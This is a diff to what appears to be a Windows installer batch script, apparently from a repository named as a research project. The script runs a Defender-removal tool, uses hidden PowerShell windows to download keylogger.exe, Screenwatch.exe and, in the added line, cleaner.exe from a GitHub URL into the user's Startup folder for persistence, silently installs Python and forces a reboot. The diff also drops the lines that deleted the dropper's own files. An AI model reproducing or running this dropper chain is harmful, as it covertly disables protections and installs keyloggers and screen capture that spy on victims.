@@ -41,15 +41,13 @@ defender_remover.exe Y
 
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/main/Original/Resources/keylogger.exe' -OutFile \"C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe\""
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/main/Original/Resources/Screenwatch.exe' -OutFile \"C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Screenwatch.exe\""
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/main/Original/Resources/cleaner.exe' -OutFile \"C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cleaner.exe\""
 
 winget install Python.Python.3.13 --source winget --silent --accept-package-agreements --accept-source-agreements 
 
-timeout /t 120
-
-del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\defender_remover.exe"
-del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\installer.ps1"
+timeout /t 60
 
 shutdown /r
-del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\wget.cmd"
+
 
 
